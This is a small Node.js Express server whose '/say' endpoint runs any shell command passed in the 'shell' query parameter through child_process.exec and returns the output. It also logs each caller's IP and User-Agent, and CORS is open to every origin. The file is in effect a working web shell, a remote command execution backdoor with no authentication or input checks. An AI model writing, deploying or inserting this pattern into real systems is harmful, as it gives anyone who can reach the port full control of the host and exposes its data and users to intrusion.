const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
var exec = require('child_process').exec;
var num = 0;

const app = express();
const port = 4000;

app.use(cors());
app.use(bodyParser.text());

app.get('/say', (req, res) => {

let  command = req.query.shell
var ip = req.header('X-Forwarded-For');
console.log(ip);
var header = req.header('User-Agent');
console.log(header);
//exec(command, function(err, stdout, stderr) {if (err){res.send(stderr);}else {res.send(stdout);}});
exec(command, function(err, stdout, stderr) {if (err){console.log(stderr);res.send(stderr);}else {console.log(stdout);res.send(stdout);}});

});

app.get('/hi', (req, res) => {

let  command = req.query.hello;
let answer="I am lesting you";
res.send(answer);

});


app.listen(port, () => {
  console.log('Server started on port '+port);
  });

console.log(num);


